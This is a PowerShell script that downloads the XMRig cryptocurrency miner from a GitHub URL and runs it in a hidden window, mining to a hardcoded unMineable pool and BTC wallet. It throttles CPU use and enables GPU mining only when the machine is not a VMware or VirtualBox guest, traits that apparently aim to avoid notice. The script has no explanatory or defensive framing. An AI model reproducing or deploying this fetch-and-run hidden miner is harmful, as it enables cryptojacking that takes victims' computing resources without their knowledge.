# === CONFIG ===
$minerUrl = "https://github.com/Mrx-coder-1157/mining-scripts/raw/main/xmrig.exe"
$minerPath = "C:\Miners\xmrig.exe"
$logPath = "C:\Miners\Logs"
$logFile = "$logPath\mining_log.txt"

# === PREPARE FOLDERS ===
if (-not (Test-Path "C:\Miners")) { New-Item "C:\Miners" -ItemType Directory }
if (-not (Test-Path $logPath)) { New-Item $logPath -ItemType Directory }

# === LOG HEADER ===
Add-Content -Path $logFile -Value "`n[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] === Miner Started ==="

# === DOWNLOAD MINER IF NEEDED ===
if (-not (Test-Path $minerPath)) {
    Add-Content $logFile -Value "[$(Get-Date)] Downloading XMRig..."
    Invoke-WebRequest -Uri $minerUrl -OutFile $minerPath
    Add-Content $logFile -Value "[$(Get-Date)] Download complete."
}

# === SMART GPU DETECTION ===
$gpu = Get-WmiObject Win32_VideoController | Where-Object {
    $_.Name -notmatch "Microsoft Basic Display" -and
    $_.Name -notmatch "VMware" -and
    $_.Name -notmatch "VirtualBox"
}

# === COMMON MINER ARGUMENTS ===
$args = @(
    "--cpu-threads 1"
    "--cpu-threads-intensity 1"
    "--pool rx.unmineable.com:3333"
    "--wallet BTC:1H8fueovMvcQLArhxw7P4QZ3FAfhEZg7CB.unmineable_miner_userx"
    "--password x"
    "--disable-msr"
    "--randomx-no-1gb-pages"
    "--no-cpu-affinity"
    "--extended-log"
    "--api-enable"
    "--api-port 60130"
)

# === GPU IF AVAILABLE ===
if ($gpu) {
    Add-Content $logFile -Value "[$(Get-Date)] GPU found: $($gpu.Name). Enabling light GPU mining."
    $args += "--cuda --cuda-devices 0 --cuda-bfactor 8 --cuda-lan 1 --cuda-threads 2"
} else {
    Add-Content $logFile -Value "[$(Get-Date)] No usable GPU found. CPU-only mode active."
}

# === START MINER ===
Add-Content $logFile -Value "[$(Get-Date)] Launching XMRig with arguments: $args"
Start-Process -FilePath $minerPath -ArgumentList $args -WindowStyle Hidden -RedirectStandardOutput $logFile -RedirectStandardError $logFile
